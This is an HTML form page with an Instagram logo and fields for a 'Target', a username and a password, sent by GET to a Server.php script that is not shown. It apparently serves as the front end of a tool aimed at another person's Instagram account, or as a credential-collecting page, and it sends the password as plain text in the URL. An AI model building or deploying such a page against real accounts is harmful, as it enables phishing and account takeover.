<html>
    <head>
        <style>
            .body{
                background-color: black;
                text-align: center;
                overflow-y: hidden;
                height: 100%;
            }
            form{
                /*border: 1px solid red;*/
                height: 600px;
                
            }
            /*div{
                
                padding: 70px 300px 50px ;
            }*/
            img{
                width: 200px;
                height: 200px;
                margin-top: 30px;
                margin-left: 0px;
            }
            .text{
                width: 60%;
                height: 30px;
            }
            label{
                color: white;
            }
            .button{
                margin-top: 150px;
                height: 35px;
                width: 100px;
            }            
        </style>

        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
        <script src="js.js"></script>

    </head>
    <body>
        <div class="body">
            <form action="Server.php"  method="GET" class="offset-lg-3 col-sm-12 col-lg-6" name="form" id="Form" onsubmit="Check()">
                <img src="NicePng_instagram-circle-logo-png_475183.png">

                <br/><br/><br/><br/><br/>
                <label>Target :</label><input type="text" name="Target" class="text" id="UserName" ><br/>
                <br/><br/>

                <label>Username :</label><input type="text" name="UserName" class="text" id="UserName" ><br/>
                <br/>
                <label>Password :</label><input type="text" name="Password" class="text" id="UserName" ><br/>
                

                <input type="submit" class="button col-sm-10 col-lg-3 col-sm-6 offset-7" value="Next" name="send">
            </form>
        </div>

    
    </body>
</html>